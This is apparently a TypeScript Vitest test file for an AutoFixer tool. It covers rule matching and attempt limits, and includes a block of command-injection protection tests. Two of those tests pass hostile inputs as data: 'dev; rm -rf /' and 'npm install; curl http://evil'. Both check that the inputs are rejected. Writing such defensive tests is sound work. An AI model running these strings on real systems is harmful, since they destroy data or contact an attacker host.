import { describe, it, expect, beforeEach, vi } from 'vitest';
import { execFileSync, spawn } from 'child_process';
import { EventCenter } from '../event-center';
import { AutoFixer } from '../auto-fixer';

vi.mock('child_process', () => ({
  execFileSync: vi.fn(() => Buffer.from('')),
  execSync: vi.fn(() => Buffer.from('')),
  spawn: vi.fn(() => ({ unref: vi.fn() })),
}));

const mockedExecFileSync = vi.mocked(execFileSync);
const mockedSpawn = vi.mocked(spawn);

describe('AutoFixer', () => {
  let ec: EventCenter;
  let fixer: AutoFixer;

  beforeEach(() => {
    ec = new EventCenter();
    fixer = new AutoFixer(ec);
  });

  describe('lifecycle', () => {
    it('should not fix when not started', () => {
      const event = ec.createEvent({ projectId: 'proj-1', title: 'Not Started' });
      const result = fixer.evaluateAndFix(event);
      expect(result).toBe(false);
    });

    it('should start and stop', () => {
      fixer.start({ projectId: 'proj-1', projectPath: '/tmp', rules: [] });
      expect((fixer as unknown as { running: boolean }).running).toBe(true);
      fixer.stop();
      expect((fixer as unknown as { running: boolean }).running).toBe(false);
    });
  });

  describe('evaluateAndFix', () => {
    it('should update-status action successfully', () => {
      const event = ec.createEvent({
        projectId: 'proj-1',
        title: 'Status Test',
        dedupeKey: 'dk-status',
      });
      fixer.start({
        projectId: 'proj-1',
        projectPath: '/tmp',
        rules: [
          {
            name: 'status-update',
            eventFilter: () => true,
            actions: [{ type: 'update-status', params: { status: 'fixing' } }],
          },
        ],
      });

      const result = fixer.evaluateAndFix(event);
      expect(result).toBe(true);

      const updated = ec.getEvent(event.id);
      expect(updated!.status).toBe('pr_opened');
    });

    it('should exhaust max attempts', () => {
      const event = ec.createEvent({
        projectId: 'proj-1',
        title: 'Exhaust Test',
        dedupeKey: 'dk-exhaust',
      });
      fixer.start({
        projectId: 'proj-1',
        projectPath: '/tmp',
        rules: [
          {
            name: 'exhaust-test',
            eventFilter: () => true,
            actions: [{ type: 'run-script', params: { script: 'exit 1' } }],
            maxAttempts: 2,
          },
        ],
      });

      fixer.evaluateAndFix(event);
      fixer.evaluateAndFix(event);
      const result = fixer.evaluateAndFix(event);
      expect(result).toBe(false);

      const events = ec.listEvents();
      const exhausted = events.find((e) => e.title.includes('exhausted'));
      expect(exhausted).toBeDefined();
    });

    it('should not match non-matching rules', () => {
      const event = ec.createEvent({
        projectId: 'proj-1',
        title: 'No Match',
        severity: 'p3',
        dedupeKey: 'dk-nomatch',
      });
      fixer.start({
        projectId: 'proj-1',
        projectPath: '/tmp',
        rules: [
          {
            name: 'p1-only',
            eventFilter: (e) => e.severity === 'p1',
            actions: [{ type: 'update-status', params: { status: 'fixing' } }],
          },
        ],
      });

      const result = fixer.evaluateAndFix(event);
      expect(result).toBe(false);
    });
  });

  describe('command injection 防护', () => {
    beforeEach(() => {
      mockedExecFileSync.mockClear();
      mockedSpawn.mockClear();
    });

    it('restart-process：恶意进程名（含 shell 元字符）被拒绝，不 spawn', () => {
      const event = ec.createEvent({
        projectId: 'proj-1',
        title: 'Injection',
        dedupeKey: 'dk-inj-restart',
      });
      fixer.start({
        projectId: 'proj-1',
        projectPath: '/tmp',
        rules: [
          {
            name: 'restart-evil',
            eventFilter: () => true,
            actions: [{ type: 'restart-process', params: { process: 'dev; rm -rf /' } }],
          },
        ],
      });

      const result = fixer.evaluateAndFix(event);
      expect(result).toBe(false);
      expect(mockedSpawn).not.toHaveBeenCalled();
    });

    it('run-script：含 shell 元字符的脚本被拒绝，不执行', () => {
      const event = ec.createEvent({
        projectId: 'proj-1',
        title: 'Injection',
        dedupeKey: 'dk-inj-script',
      });
      fixer.start({
        projectId: 'proj-1',
        projectPath: '/tmp',
        rules: [
          {
            name: 'run-evil',
            eventFilter: () => true,
            actions: [{ type: 'run-script', params: { script: 'npm install; curl http://evil' } }],
          },
        ],
      });

      const result = fixer.evaluateAndFix(event);
      expect(result).toBe(false);
      expect(mockedExecFileSync).not.toHaveBeenCalled();
    });

    it('run-script：白名单命令正常执行（行为保持），参数不经 shell', () => {
      const event = ec.createEvent({
        projectId: 'proj-1',
        title: 'Safe',
        dedupeKey: 'dk-safe-script',
      });
      fixer.start({
        projectId: 'proj-1',
        projectPath: '/tmp',
        rules: [
          {
            name: 'run-safe',
            eventFilter: () => true,
            actions: [{ type: 'run-script', params: { script: 'node --version' } }],
          },
        ],
      });

      const result = fixer.evaluateAndFix(event);
      expect(result).toBe(true);
      expect(mockedExecFileSync).toHaveBeenCalledWith(
        'node',
        ['--version'],
        expect.objectContaining({ timeout: 30000 }),
      );
    });

    it('restart-process：合法进程名正常 spawn，且不启用 shell', () => {
      const event = ec.createEvent({
        projectId: 'proj-1',
        title: 'Restart',
        dedupeKey: 'dk-safe-restart',
      });
      fixer.start({
        projectId: 'proj-1',
        projectPath: '/tmp',
        rules: [
          {
            name: 'restart-safe',
            eventFilter: () => true,
            actions: [{ type: 'restart-process', params: { process: 'dev' } }],
          },
        ],
      });

      const result = fixer.evaluateAndFix(event);
      expect(result).toBe(true);
      expect(mockedSpawn).toHaveBeenCalledWith(
        'npm',
        ['run', 'dev'],
        expect.objectContaining({ detached: true }),
      );
      const spawnOpts = mockedSpawn.mock.calls[0]?.[2] as Record<string, unknown> | undefined;
      expect(spawnOpts?.shell).not.toBe(true);
    });
  });
});
